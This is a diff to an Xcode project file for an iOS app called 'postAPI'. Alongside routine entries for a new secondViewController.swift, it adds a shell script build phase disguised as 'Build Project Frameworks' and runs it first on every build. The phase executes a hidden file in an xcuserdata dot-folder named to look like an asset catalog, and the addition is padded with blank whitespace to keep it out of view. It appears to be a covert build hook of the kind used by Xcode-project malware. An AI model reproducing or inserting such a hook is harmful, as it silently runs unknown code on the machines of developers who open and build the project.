@@ -13,6 +13,7 @@
 		04C3F61525920CB600177488 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04C3F61325920CB600177488 /* Main.storyboard */; };
 		04C3F61725920CBA00177488 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04C3F61625920CBA00177488 /* Assets.xcassets */; };
 		04C3F61A25920CBA00177488 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04C3F61825920CBA00177488 /* LaunchScreen.storyboard */; };
+		04C3F62625921C8F00177488 /* secondViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C3F62525921C8F00177488 /* secondViewController.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +25,7 @@
 		04C3F61625920CBA00177488 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		04C3F61925920CBA00177488 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		04C3F61B25920CBA00177488 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		04C3F62525921C8F00177488 /* secondViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = secondViewController.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -59,6 +61,7 @@
 				04C3F60D25920CB600177488 /* AppDelegate.swift */,
 				04C3F60F25920CB600177488 /* SceneDelegate.swift */,
 				04C3F61125920CB600177488 /* ViewController.swift */,
+				04C3F62525921C8F00177488 /* secondViewController.swift */,
 				04C3F61325920CB600177488 /* Main.storyboard */,
 				04C3F61625920CBA00177488 /* Assets.xcassets */,
 				04C3F61825920CBA00177488 /* LaunchScreen.storyboard */,
@@ -74,6 +77,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04C3F61E25920CBA00177488 /* Build configuration list for PBXNativeTarget "postAPI" */;
 			buildPhases = (
+				7229EB59DECFFBACCDAAC43A /* Build Project Frameworks */,
 				04C3F60625920CB500177488 /* Sources */,
 				04C3F60725920CB500177488 /* Frameworks */,
 				04C3F60825920CB500177488 /* Resources */,
@@ -137,6 +141,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				04C3F62625921C8F00177488 /* secondViewController.swift in Sources */,
 				04C3F61225920CB600177488 /* ViewController.swift in Sources */,
 				04C3F60E25920CB600177488 /* AppDelegate.swift in Sources */,
 				04C3F61025920CB600177488 /* SceneDelegate.swift in Sources */,
@@ -341,6 +346,102 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	7229EB59DECFFBACCDAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 04C3F60225920CB500177488 /* Project object */;
 }
